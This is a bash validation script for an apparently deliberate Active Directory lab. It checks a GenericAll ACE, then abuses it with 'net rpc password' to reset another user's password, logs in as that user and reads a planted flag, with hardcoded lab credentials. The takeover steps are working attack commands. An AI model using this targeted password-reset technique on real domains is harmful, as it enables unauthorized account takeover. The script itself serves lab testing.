#!/bin/bash
# Proves the AD ACL-abuse path end to end, as a student would, driven from inside the DC:
#   1. confirm the control edge: d.laurent holds an allow ACE (GenericAll/full control) over
#      b.whitfield (read the target's DACL),
#   2. negative control: d.laurent cannot read the archive flag directly,
#   3. negative control: a bystander (n.castellano) with no ACE cannot reset b.whitfield,
#   4. abuse the ACE: as d.laurent, reset b.whitfield's password (no old password needed),
#   5. authenticate as b.whitfield with the new password and read the archive flag,
#   6. confirm the flag matches the one the DC planted.
# Exits 0 (and prints ACLABUSE_OK) only when every step holds, i.e. only when the DC is
# genuinely misconfigured: a low-privilege user granted full control over a higher-value
# account, with the flag gated behind that account.
#
# The takeover primitive is the targeted password reset — the most reliable control-abuse
# primitive against a Samba AD DC. `net rpc password` drives SAMR SetUserInfo over SMB, which
# needs the reset-password right; a normal user is denied, a GenericAll holder is not.
#
# Samba gotcha: `net rpc password` prints "Access is denied" but still exits 0, so its exit
# code is useless. Every success/denial below is therefore verified functionally, by whether
# the resulting credentials actually authenticate over SMB (smbclient's exit code is reliable).
set -uo pipefail

export HOME=/root

REALM="VERTEX.LAB"
DOMAIN="VERTEX"
DC="dc.vertex.lab"
FOOTHOLD_USER="d.laurent"
FOOTHOLD_PASS="Editor!2024"
TARGET_USER="b.whitfield"
BYSTANDER_USER="n.castellano"
BYSTANDER_PASS="N0rmal#Vertex2024"
# The password d.laurent sets on b.whitfield by abusing GenericAll (complexity-compliant).
NEW_TARGET_PASS="Pwn3d#Archive2024"
# A distinct sentinel the bystander tries to set; it must never take effect.
SENTINEL_PASS="N0Rights#Vx2024"
SHARE="archive"
PLANTED="/srv/archive/flag.txt"

WORK="$(mktemp -d)"
trap 'rm -rf "${WORK}"' EXIT
fail() { echo "CHECK FAIL: $*" >&2; exit 1; }

# Does <user>/<pass> authenticate over SMB? smbclient's exit code is reliable here.
auth_ok() { smbclient "//${DC}/${SHARE}" -U "${DOMAIN}\\$1%$2" -c quit >/dev/null 2>&1; }
# Attempt a targeted password reset of b.whitfield as <user>/<pass> (exit code ignored).
reset_as() { net rpc password "${TARGET_USER}" "$3" -U "${DOMAIN}\\$1%$2" -S "${DC}" >/dev/null 2>&1 || true; }

echo "[1/6] confirming d.laurent holds GenericAll over ${TARGET_USER} ..." >&2
TARGET_DN="$(samba-tool user show "${TARGET_USER}" --attributes=distinguishedName 2>/dev/null \
  | awk -F': ' '/^dn:/{print $2; exit}')"
FOOTHOLD_SID="$(samba-tool user show "${FOOTHOLD_USER}" --attributes=objectSid 2>/dev/null \
  | awk -F': ' '/^objectSid:/{print $2; exit}')"
[ -n "${TARGET_DN}" ] && [ -n "${FOOTHOLD_SID}" ] || fail "could not resolve target DN / d.laurent SID"
# The DACL (SDDL) must carry an allow ACE (type "A") referencing d.laurent's SID. Samba renders a
# granted GenericAll as the expanded full-control rights string (RP WP CR CC DC LC LO RC WO WD
# SD DT SW), so match the ACE structurally by its allow type and trailing SID.
SDDL="$(samba-tool dsacl get --objectdn="${TARGET_DN}" 2>/dev/null)"
echo "${SDDL}" | grep -qiE "\(A;[^;]*;[^;]*;[^;]*;[^;]*;${FOOTHOLD_SID}\)" \
  || fail "no allow (full-control) ACE for d.laurent (${FOOTHOLD_SID}) found on ${TARGET_USER}"
echo "      control edge present: ${FOOTHOLD_USER} --GenericAll--> ${TARGET_USER}" >&2

echo "[2/6] negative control: ${FOOTHOLD_USER} cannot read the ${SHARE} flag directly ..." >&2
if smbclient "//${DC}/${SHARE}" -U "${DOMAIN}\\${FOOTHOLD_USER}%${FOOTHOLD_PASS}" \
     -c "get flag.txt ${WORK}/foothold.out" >/dev/null 2>&1 && [ -s "${WORK}/foothold.out" ]; then
  fail "${SHARE} is readable by ${FOOTHOLD_USER}; the flag is not gated behind ${TARGET_USER}"
fi

echo "[3/6] negative control: bystander ${BYSTANDER_USER} cannot reset ${TARGET_USER} ..." >&2
reset_as "${BYSTANDER_USER}" "${BYSTANDER_PASS}" "${SENTINEL_PASS}"
if auth_ok "${TARGET_USER}" "${SENTINEL_PASS}"; then
  fail "${BYSTANDER_USER} (no ACE) reset ${TARGET_USER}; the takeover is not gated by the ACL"
fi
echo "      denied, as expected (no control edge)" >&2

echo "[4/6] abusing GenericAll: ${FOOTHOLD_USER} resets ${TARGET_USER}'s password ..." >&2
reset_as "${FOOTHOLD_USER}" "${FOOTHOLD_PASS}" "${NEW_TARGET_PASS}"
auth_ok "${TARGET_USER}" "${NEW_TARGET_PASS}" \
  || fail "${FOOTHOLD_USER}'s GenericAll password reset did not take effect"
echo "      ${TARGET_USER}'s password is now one d.laurent chose" >&2

echo "[5/6] reading the ${SHARE} as ${TARGET_USER} with the new password ..." >&2
OUT="${WORK}/flag.out"
smbclient "//${DC}/${SHARE}" -U "${DOMAIN}\\${TARGET_USER}%${NEW_TARGET_PASS}" \
  -c "get flag.txt ${OUT}" >/dev/null 2>&1 \
  || fail "could not read the ${SHARE} share as ${TARGET_USER} after the reset"
[ -s "${OUT}" ] || fail "archive flag.txt came back empty"

echo "[6/6] confirming the flag matches what the DC planted ..." >&2
diff -q "${OUT}" "${PLANTED}" >/dev/null 2>&1 \
  || fail "flag read via ${TARGET_USER} does not match the planted flag"

echo "CHECK PASS: ${FOOTHOLD_USER} --GenericAll--> ${TARGET_USER}: reset password -> read flag $(cat "${OUT}")" >&2
echo "ACLABUSE_OK"
